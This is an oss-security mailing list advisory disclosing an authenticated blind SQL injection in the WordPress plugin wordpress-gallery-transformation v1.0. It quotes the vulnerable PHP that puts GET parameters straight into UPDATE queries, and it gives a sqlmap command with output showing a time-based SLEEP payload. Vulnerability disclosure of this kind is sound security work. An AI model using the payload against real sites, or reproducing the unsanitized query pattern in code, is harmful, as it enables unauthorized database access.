  oss-security - Blind SQL Injection in Wordpress plugin  wordpress-gallery-transformation v1.0            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 25 Aug From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Blind SQL Injection in Wordpress plugin  wordpress-gallery-transformation v1.0  Title: Authenticated Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0 Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/wordpress-gallery-transformation/ Vendor: http://angrybyte.com Vendor Notified: Vendor Contact: plugins@...dpress.org Advisory: Description: Transforms word press into a gallery, wallpapers website, you name it. Vulnerability: SQL injection is in ./wordpress-gallery-transformation/gallery.php via $jpic parameter being unsanitized before being passed into an SQL query.  -- $pfx=$wpdb->prefix; if($_GET['picnj']){ $jpic=$_GET['picnj']; $jnm=$_GET['nmj']; $wpdb->query("update {$pfx}gallery set name='{$jnm}' where id=$jpic;"); $wpdb->query("update {$pfx}gallery set rates=44"); return 'ok?';  The attacker will need to be logged in and able to manage the gallery in order to exploit.  Exploit Code: 	• $ sqlmap --load-cookies=./cookie -u 'http://example.com/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=*' --level 4 --risk 3 --dbms mysql 	•   	•   	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•    Type: AND/OR time-based blind 	•    Title: MySQL >= time-based blind - Parameter replace 	•    Payload: http://example.com:80/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=(CASE WHEN THEN SLEEP(5) ELSE END) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      